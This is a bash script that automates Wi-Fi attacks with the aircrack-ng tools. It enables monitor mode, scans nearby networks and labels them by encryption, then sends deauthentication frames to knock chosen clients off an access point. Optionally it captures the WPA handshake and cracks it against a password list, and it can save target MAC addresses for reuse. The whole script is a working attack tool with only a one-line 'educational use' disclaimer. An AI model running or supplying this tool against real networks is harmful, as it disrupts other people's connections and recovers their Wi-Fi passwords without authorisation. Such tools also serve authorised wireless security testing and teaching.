#!/bin/bash

# interfaces
interface=wlp8s0
filePath=
# color
green=`tput setaf 2`
red=`tput setaf 1`
yellow=`tput setaf 11`
reset=`tput sgr0`
scanTime=10s

# check root permissions
if [ "$EUID" -ne 0 ]
 	then echo "${red}ERROR: Run this script as root!"
 	exit
fi

# help
showHelp() {
	echo ""
	echo "Usage: ./aircrack.sh <options>"
	echo ""
	echo "Options:"
	echo " -i <interface>: Wireless network interface to use. Default is wlp8s0."
	echo " -f <password file>: Path to password file for cracking network key."
	echo " -h: show help"
	echo ""
	exit
}

while getopts 'hf:i:' flag; do
  case "${flag}" in
  	h) showHelp ;;
    i) interface="${OPTARG}" ;;
	  f) filePath="${OPTARG}" ;;
    *) interface=wlp8s0
  esac
done

# check interface
checkInterface=$(sudo airmon-ng | grep -w $interface | wc -l)

if [ "$checkInterface" == "0" ]; then
	# interface does not exist
	# check interface+mon
	checkInterfaceMon=$(sudo airmon-ng | grep -w "${interface}mon" | wc -l)
	if [ "$checkInterfaceMon" == "0" ]; then
		# interface + mon does not exist
		echo "${red}ERROR: $interface is not a valid network interface!${reset}"
		showHelp
		exit	
	else
		# append mon to interface
		interfaceMon="${interface}mon"	
	fi	
else
	# interface exist
	interfaceMon=$interface
fi	

mangedMode=$(sudo airmon-ng | grep $interfaceMon | wc -l)

# Welcome text
figlet "Aircrack"
echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissions to test!"
echo ""

# Check if Wi-Fi card is in monitor mode
if [ "$mangedMode" == "0" ]
	then
	echo ""
	echo "WARNING: Montior mode is not enabled for $interface"
	read -p 'Enable monitor mode (y/n)? ' option1

	if [ "$option1" == "y" ] || [ "$option1" == "Y" ]
	then
		echo ""
		sudo airmon-ng start $interface
		#interfaceMon=$interface+="mon"
	fi
else
	echo "${green}MONITOR MODE ENABLED: $interfaceMon${reset}"
fi

# Choose operation
start () {
	echo ""
	echo "-- SELECT AN OPERATION --"
	echo "[1] Start network scan"
	echo "[2] Manuel de-auth attack"
	echo "[3] Disable monitor mode for $interfaceMon"
	echo ""
	read -p 'Select operation [1-3]: ' option2
	echo ""

	if [ "$option2" == "1" ] # auto attack
		then
		sudo rm scan-01.* --force > /dev/null
		echo "-- CHOOSE NETWORK BAND --"
		echo "[1] 2.4 GHz"
		echo "[2] 5 GHz"
		echo ""
		read -p 'Choose network band [1-2]: ' band
		echo ""
		read -p 'Enter scan time in seconds (default is 10): ' time
		echo ""

		if [ "$time" != "" ]; then
			scanTime="${time}s"
		fi

		if [ "$band" == "1" ]; then
			echo "Scanning networks on 2.4GHz for $scanTime..."
			screen -d -m sudo airodump-ng -w scan --output-format csv $interfaceMon
		else	
			echo "Scanning networks on 5GHz for $scanTime..."
			screen -d -m sudo airodump-ng -w scan --output-format csv $interfaceMon -b a
		fi
		sleep $scanTime
		sudo killall screen
		sed -i '1d' scan-01.csv
		sed -i '1d' scan-01.csv
		echo ""
		echo "-- SCAN RESULT --"
		echo ""
		echo "${green}GREEN: OPEN NETWORK${reset}"
		echo "${yellow}YELLOW: WEAK SECURITY (WPA, WPA2, WEP, OPN)${reset}"
		echo "${red}RED: STRONG SECURITY, NOT POSSIBLE TO DE-AUTH (WPA3)${reset}"
		echo ""
		i=1
		filename=scan-01.csv
		while read line; do
			stop=$(echo $line | grep "Station MAC" | wc -l)
			if [ "$stop" == "1" ]; then
				# no more networks, exit loop
				break
			fi
			# parse CSV file
			mac=${line:0:17}
			channel=${line:61:2}
			name=${line: -22}
			name=$(echo $name | grep -o '[^\,.]\{4,\}')
			name=$(echo $name | xargs)
			# encryption method
			security=$(echo $line | grep -o 'WPA2\|WPA3\|OPN\|WEP')
			security=${security//$'\n'/}
			if [ "$name" == "" ]; then 
					# Network name is unknown
					name="Hidden network"
			fi
			if [ "$security" = "" ]; then
				# no security
				echo "${green}[$i] $name ["Open"] ($mac) - channel: $channel${reset}"
			elif [ "$security" == "WPA" ] || [ "$security" == "WPA2" ] || [ "$security" == "WEP" ] || [ "$security" == "OPN" ]; then
				# weak security
				echo "${yellow}[$i] $name [$security] ($mac) - channel: $channel${reset}"
			else
				# WPA3
				if [ "$security" == "WPA3WPA2" ]; then
					security=WPA3
				fi
				echo "${red}[$i] $name [$security] ($mac) - channel: $channel${reset}"
			fi	
			i=$((i+1))
		done < $filename
		# Choose network
		echo ""
		i=$((i-2))
		read -p "Choose network [1-$i]: " network
		res=$(sed -n $((network))p scan-01.csv)
		ap=${res:0:17}
		channel=${res:61:2}
		name=${res: -22}
		name=$(echo $name | grep -o '[^\,.]\{4,\}')
		security=$(echo $res | grep -o 'WPA2\|WPA3\|OPN\|WEP')
		security=${security//$'\n'/}
		echo ""
		echo "$name [$security] ($ap) - channel: $channel"
		echo ""
		echo "-- SELECT OPERATION --"
		echo "[1] See devices connected to network"
		echo "[2] Perform de-auth attack on network"
		echo "[3] Quit"
		echo ""
		read -p "Select operation [1-3]: " choose
		echo ""

		if [ "$choose" == "1" ]; then
			sudo airodump-ng $interfaceMon --bssid $ap --channel $channel -a
		elif [ "$choose" == "2" ]; then
			read -p "De-auth requests (default is 1): " number
			echo ""
			read -p "Try to crack WiFi password (y/n)? " capture
			echo ""
			deAuth
		else
			exit
		fi
	elif [ "$option2" == "2" ] # manual attack
		then
		echo ""
		if [ -f "file" ]
			then
			read -p "Load saved targets (y/n)? " load
			echo ""
		fi

	if [ "$load" == "y" ] || [ "$load" == "Y" ]
		then
		currentLine=1
		lines=$(wc -l < file)

		targets=$((lines / 4))

		echo "$targets saved targets"

		for i in $(eval echo "{1..$targets}"); do
			echo ""
			echo "[Target $i]"
			echo "Name: $(sed -n $((currentLine))p file)"
			echo "AP MAC: $(sed -n $((currentLine+1))p file)"
			echo "Client MAC: $(sed -n $((currentLine+2))p file)"
		  echo "Channel: $(sed -n $((currentLine+3))p file)"
		  currentLine=$((currentLine+4))
		done

		echo ""
		read -p "Enter target [1-$targets]: " targ
		targ=$((targ-1))
		currentLine=$((1+($targ*4)))
		name=$(sed -n $((currentLine))p file)
		ap=$(sed -n $((currentLine+1))p file)
		client=$(sed -n $((currentLine+2))p file)
		channel=$(sed -n $((currentLine+3))p file)

		echo ""
		echo "${green}$name ($client) is selected! ${reset}"
	  echo ""
		read -p "De-auth requests (default is 1): " number
		echo ""
		read -p "Try to crack WiFi password (y/n)? " capture
		echo ""
		deAuth
	else
		echo "-- New target --"
		read -p "Access point MAC address: " ap
		read -p "Client MAC address (leave empty for every device): " client
		read -p "Channel: " channel
		read -p "De-auth requests (default is 1): " number
		read -p "Try to crack WiFi password (y/n)? " capture
		read -p "Save target for later (y/n)? " save

		if [ "$save" == "y" ] || [ "$save" == "Y" ]
			then
			read -p "Name: " name
			printf "$name\n$ap\n$client\n$channel\n" >> file # save to file
		fi

		deAuth
	fi	
	elif [ "$option2" == "3" ]
		then
		echo "Stoppping interface..."
		sudo airmon-ng stop $interfaceMon > /dev/null
		echo "Done."
	fi
}

deAuth () {
  sudo airmon-ng start $interfaceMon $channel > /dev/null

  if [ "$number" == "" ] # default de-auth requests is 1
  	then
  		number=1
  fi

  if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
  then
  	echo "-- Starting handshake capture --"
  	echo ""
  	sudo rm capture-* --force
  	screen -d -m sudo airodump-ng -d $ap -c $channel -w capture $interfaceMon > /dev/null
  fi

  echo "-- Starting de-auth attack ($number requests) --"
	echo ""

	if [ -z "$client" ]
	then
		sudo aireplay-ng -0 $number -a $ap $interfaceMon
	else
		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
	fi

	if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
  then
  	echo ""
  	echo "-- Stopping handshake capture (10s) ---"
  	sleep 10s
		sudo killall screen
		echo ""
		echo "-- Cracking Wi-Fi key --"
		if [ "$filePath" = "" ]
			then
				echo "${red}ERROR: No password file specified."
				showHelp
				exit
			fi
  	sudo aircrack-ng capture-01.cap -w $filePath
  fi

	echo ""
	read -p "${green}Attack completed. Press any key to continue...${reset}" blah

	start
}

start
